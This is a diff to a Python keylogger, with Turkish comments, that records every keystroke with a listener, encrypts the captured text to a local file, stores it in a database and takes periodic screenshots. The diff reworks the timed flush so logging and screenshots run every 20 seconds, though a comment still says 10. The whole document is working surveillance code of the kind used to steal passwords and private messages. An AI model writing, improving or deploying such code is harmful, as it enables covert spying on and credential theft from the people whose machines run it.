@@ -14,8 +14,7 @@ f = Fernet(key)  # Anahtar üzerinde işlem yapacak Fernet nesnesini oluşturuyo
 
 # Log dosyasının yolu
 log_dir = os.path.expanduser('~') + "/PycharmProjects/pythonProject/keylogger/"
-log_file = log_dir + "log.txt"
-encrypted_log_file = "e_log.txt"
+encrypted_log_file = log_dir + "e_log.txt"
 keys = []
 
 
@@ -27,30 +26,29 @@ def encrypt_content(content):
 # Klavye tuşlarını kaydetme
 def on_press(key):
     keys.append(key)
-    if len(keys) >= 10:  # 10 tuş basımından sonra kaydet
-        write_file(keys)
-        keys.clear()
 
 
 # Tuş basımlarını dosyaya yazma
-def write_file(keys):
-    log_content = ''
-    for key in keys:
-        k = str(key).replace("'", "")
-        if k.find("space") > 0:
-            log_content += ' '
-        elif k.find("enter") > 0:
-            log_content += '\n'
-        elif k.find("Key") == -1:
-            log_content += k
-    log_content += f' [{datetime.now()}]\n'
+def write_file():
+    if keys:
+        log_content = ''
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                log_content += ' '
+            elif k.find("enter") > 0:
+                log_content += '\n'
+            elif k.find("Key") == -1:
+                log_content += k
+        log_content += f' [{datetime.now()}]\n'
 
-    # Yeni log içeriğini şifreleme ve dosyaya ekleme
-    encrypted_content = encrypt_content(log_content)
-    with open(encrypted_log_file, "ab") as file:
-        file.write(encrypted_content + b'\n')  # Satır sonu ekleyerek her bir bloğu ayırıyoruz
-    # Veritabanına ekleme
-    insert_log(log_content)
+        # Yeni log içeriğini şifreleme ve dosyaya ekleme
+        encrypted_content = encrypt_content(log_content)
+        with open(encrypted_log_file, "ab") as file:
+            file.write(encrypted_content + b'|')  # Ayırıcı olarak '|' kullanarak şifrelenmiş veriyi ekliyoruz
+        # Veritabanına ekleme
+        insert_log(log_content)
+        keys.clear()
 
 
 # Ekran görüntüsü alma ve kaydetme
@@ -64,13 +62,14 @@ def take_screenshot():
 
 # Zamanlanmış görevler
 def job():
+    write_file()
     take_screenshot()
-    # 60 saniye sonra bir sonraki işlemi planla
-    Timer(60, job).start()
+    # 10 saniye sonra bir sonraki işlemi planla
+    Timer(20, job).start()
 
 
 # Dinleyici fonksiyonları
 with Listener(on_press=on_press) as listener:
-    # 60 saniye sonra ilk işlemi planla
-    Timer(60, job).start()
+    # 10 saniye sonra ilk işlemi planla
+    Timer(20, job).start()
     listener.join()
